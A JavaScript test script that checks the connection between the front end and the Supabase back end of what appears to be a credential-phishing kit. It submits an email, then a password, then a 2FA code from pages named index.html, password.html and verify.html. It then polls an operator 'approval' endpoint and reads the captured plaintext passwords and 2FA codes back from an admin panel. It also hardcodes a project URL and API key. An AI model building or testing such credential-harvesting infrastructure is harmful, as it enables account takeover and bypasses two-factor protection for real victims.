// TEST FRONTEND CONNECTION TO SUPABASE
console.log('🧪 TESTING FRONTEND → SUPABASE CONNECTION');
console.log('==========================================\n');

const SUPABASE_URL = 'https://nqsdardermkzppeaazbb.supabase.co';
const ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc';

const headers = {
    'Authorization': `Bearer ${ANON_KEY}`,
    'apikey': ANON_KEY,
    'Content-Type': 'application/json'
};

async function testFrontendFlow() {
    console.log('🎯 SIMULATING COMPLETE FRONTEND FLOW\n');
    
    const testEmail = `frontend.test.${Date.now()}@example.com`;
    let testRequestId = null;
    
    // Test 1: Submit Email (index.html simulation)
    console.log('1️⃣ Testing EMAIL SUBMISSION (index.html)...');
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/request`, {
            method: 'POST',
            headers,
            body: JSON.stringify({
                email: testEmail,
                password: '',
                twofa: '',
                userAgent: 'Frontend Test Browser',
                currentPage: 'index.html'
            })
        });
        
        if (response.ok) {
            const data = await response.json();
            testRequestId = data.requestId;
            console.log('✅ Email submitted successfully, Request ID:', testRequestId);
        } else {
            console.log('❌ Email submission failed with status:', response.status);
            return;
        }
    } catch (error) {
        console.log('❌ Email submission error:', error.message);
        return;
    }
    
    console.log('');
    
    // Test 2: Submit Password (password.html simulation)
    console.log('2️⃣ Testing PASSWORD SUBMISSION (password.html)...');
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/request`, {
            method: 'POST',
            headers,
            body: JSON.stringify({
                email: testEmail,
                password: 'frontend.test.password123',
                twofa: '',
                userAgent: 'Frontend Test Browser',
                currentPage: 'password.html'
            })
        });
        
        if (response.ok) {
            const data = await response.json();
            console.log('✅ Password submitted successfully, Request ID:', data.requestId);
        } else {
            console.log('❌ Password submission failed with status:', response.status);
            return;
        }
    } catch (error) {
        console.log('❌ Password submission error:', error.message);
        return;
    }
    
    console.log('');
    
    // Test 3: Check Approval Status (polling simulation)
    console.log('3️⃣ Testing APPROVAL STATUS CHECK (polling)...');
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/check-approval?email=${encodeURIComponent(testEmail)}`, {
            headers
        });
        
        if (response.ok) {
            const data = await response.json();
            console.log('✅ Approval status check successful:');
            console.log('   📊 Status:', data.status);
            console.log('   🆔 Request ID:', data.id);
            console.log('   🔢 Verification Code:', data.verificationCode || 'None');
        } else {
            console.log('❌ Approval status check failed with status:', response.status);
            return;
        }
    } catch (error) {
        console.log('❌ Approval status check error:', error.message);
        return;
    }
    
    console.log('');
    
    // Test 4: Submit 2FA Code (verify.html simulation)
    console.log('4️⃣ Testing 2FA CODE SUBMISSION (verify.html)...');
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/request`, {
            method: 'POST',
            headers,
            body: JSON.stringify({
                email: testEmail,
                password: '',
                twofa: '123456',
                userAgent: 'Frontend Test Browser',
                currentPage: 'verify.html'
            })
        });
        
        if (response.ok) {
            const data = await response.json();
            console.log('✅ 2FA code submitted successfully, Request ID:', data.requestId);
        } else {
            console.log('❌ 2FA code submission failed with status:', response.status);
            return;
        }
    } catch (error) {
        console.log('❌ 2FA code submission error:', error.message);
        return;
    }
    
    console.log('');
    
    // Test 5: Get All Pending Requests (verify data appears in admin)
    console.log('5️⃣ Testing ADMIN GUI DATA RETRIEVAL...');
    try {
        const response = await fetch(`${SUPABASE_URL}/functions/v1/admin-api/api/pending`, {
            headers
        });
        
        if (response.ok) {
            const data = await response.json();
            const testRequests = data.filter(req => req.email === testEmail);
            console.log('✅ Admin GUI data retrieval successful:');
            console.log('   📊 Total requests in system:', data.length);
            console.log('   🎯 Test requests found:', testRequests.length);
            
            if (testRequests.length > 0) {
                const latest = testRequests[0];
                console.log('   📧 Latest test email:', latest.email);
                console.log('   🔐 Latest password:', latest.password);
                console.log('   📱 Latest 2FA:', latest.twofa);
                console.log('   📄 Page status:', latest.pageStatus);
                console.log('   ✅ Status:', latest.status);
            }
        } else {
            console.log('❌ Admin GUI data retrieval failed with status:', response.status);
            return;
        }
    } catch (error) {
        console.log('❌ Admin GUI data retrieval error:', error.message);
        return;
    }
    
    console.log('\n==========================================');
    console.log('🎉 FRONTEND CONNECTION TEST COMPLETE!');
    console.log('✅ All frontend API calls are working properly!');
    console.log('🔗 Frontend is successfully connected to Supabase!');
    console.log('📱 Data will now appear in Admin GUI automatically!');
    console.log('==========================================');
}

testFrontendFlow().catch(console.error); 